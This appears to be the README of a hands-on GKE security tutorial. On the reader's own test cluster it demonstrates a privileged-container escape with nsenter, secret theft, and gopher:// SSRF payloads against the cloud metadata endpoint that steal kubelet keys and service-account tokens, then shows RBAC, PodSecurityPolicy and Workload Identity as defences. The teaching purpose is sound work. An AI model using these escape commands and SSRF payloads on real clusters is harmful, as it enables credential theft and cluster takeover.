# tutorial-gke-security
This repository is for a tutorial of "Kubernetes Security for Microservices"

[![Open in Cloud Shell](http://gstatic.com/cloudssh/images/open-btn.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/rung/tutorial-gke-security&page=editor&cloudshell_tutorial=README.md)

## Preparation
#### Set project id
```
PROJECT_ID="Your Project Name"
```

```
gcloud config set project $PROJECT_ID
```

#### Enable GKE API
```bash
gcloud services enable container.googleapis.com
```

#### Create GKE Cluster
```bash
gcloud beta container clusters create gke-security-testing --zone us-central1-a --machine-type n1-standard-1 --num-nodes 3 --enable-pod-security-policy --async
```
- You can check the status on [console](https://console.cloud.google.com/kubernetes/list)

#### Get a credential of GKE
```bash
gcloud container clusters get-credentials gke-security-testing --zone=us-central1-a
```

#### Testing
```
kubectl get node
```

#### Deploy web server
```
kubectl apply -f manifest/ssrf_server/ -R
```
- Please don't expose deployment on the Internet through Service.

## Demo 1: Compromised Developers' PC (PodSecurityPolicy/RBAC)
#### Run root container
```
kubectl apply -f manifest/root/pod.yaml
```

#### Enter root
```
kubectl exec -it root-container -- /bin/sh -c "nsenter --mount=/proc/1/ns/mnt -- /bin/bash"
```

#### Get credentials
```
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get secret dummy-secret -o yaml
```

#### Get credentials(method 2) (Please copy this command from [GitHub](https://github.com/rung/tutorial-gke-security))
```
docker ps -q | xargs docker inspect --format='{{range .Config.Env}}{{println .}}{{end}}' | grep DB_Password
```

```
exit
```

#### How to block
- RBAC
- PodSecurityPolicy

```
alias kubectl-user='kubectl --as=system:serviceaccount:default:unprivileged-user'
```
```
kubectl delete pod root-container
```
```
kubectl delete rolebinding default-psp
```

##### Apply PodSecurityPolicy and RBAC
```
kubectl apply -f manifest/psp/ -R
```

##### Try to deploy privileged pod
```
kubectl-user apply -f manifest/root/pod.yaml
```
##### Try to use kubectl to another namaspaces
```
kubectl-user get pod -n kube-system
```

## Demo 2: Vulnerable Application (Workload Identity)
#### Port-forward
```
kubectl port-forward deployment/ssrf-server 8080:8080 2>&1 >/dev/null &
```

#### Open Web Preview
![web-preview](https://github.com/rung/tutorial-gke-security/raw/master/img/web-preview.png)
![web-page](https://github.com/rung/tutorial-gke-security/raw/master/img/web-page.png)

#### Input url (for testing)
```
https://www.example.com
```

#### Input malicious url
#### Get kubelet key
```
gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-env?alt=json HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
```
It contains "KUBELET_KEY".

![web-metadata](https://github.com/rung/tutorial-gke-security/raw/master/img/web-metadata.png)

#### Save the metadata to metadata-script/metadata.txt
```
cd metadata-script
```

```
curl -X POST 'http://localhost:8080/get_contents' --data 'url=gopher%3A%2F%2F169.254.169.254%3A80%2F_GET+%2FcomputeMetadata%2Fv1%2Finstance%2Fattributes%2Fkube-env%3Falt%3Djson+HTTP%2F1.1%250d%250aMetadata-Flavor%3A+Google%250d%250aConnection%3A+Close%250d%250a%250d%250a' -o metadata.txt
```

#### Move current kubeconfig file
```
mv ~/.kube/config ~/.kube/config.tmp
```
```
kubectl config get-contexts
```

#### Get node certificate
- Extract necessary data from metadata
```bash
bash extract.sh
```
```
ls -l metadata
```

- Send CSR and Get node certificate
```
bash make_cert.sh $(cat metadata/nodename)
```

#### Get credentials
- Set env vars
```
KUBE_OPT="--client-certificate newcert/node.crt --client-key newcert/new.key --certificate-authority metadata/ca.crt --server https://$(cat metadata/api_ip)" && echo $KUBE_OPT
```

- Get secretName
```
kubectl $KUBE_OPT describe pod | grep secret
```

- Get secret
```
kubectl $KUBE_OPT get secret dummy-secret -o yaml
```

#### Move back kubeconfig file
```
mv ~/.kube/config.tmp ~/.kube/config
```
```
kubectl config get-contexts
```

#### (Reference) Get instance token
```
gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
```

### How to block
#### [Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- Enable workload identity (Need much time)
```
gcloud beta container clusters update gke-security-testing --identity-namespace=${PROJECT_ID}.svc.id.goog --region us-central1-a
```

```
gcloud beta container node-pools update default-pool --cluster=gke-security-testing --workload-metadata-from-node=GKE_METADATA_SERVER --zone us-central1-a
```

![web-workload-identity-enabled.png](https://github.com/rung/tutorial-gke-security/raw/master/img/web-workload-identity-enabled.png)

## (After this tutorial) Delete cluster
```bash
gcloud container clusters delete gke-security-testing --zone us-central1-a --async
```

## References
- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876)
- [Hacking Kubelet on Google Kubernetes Engine](https://www.4armed.com/blog/hacking-kubelet-on-gke/)
- [The Path Less Traveled: Abusing Kubernetes Defaults](https://speakerdeck.com/iancoldwater/the-path-less-traveled-abusing-kubernetes-defaults)
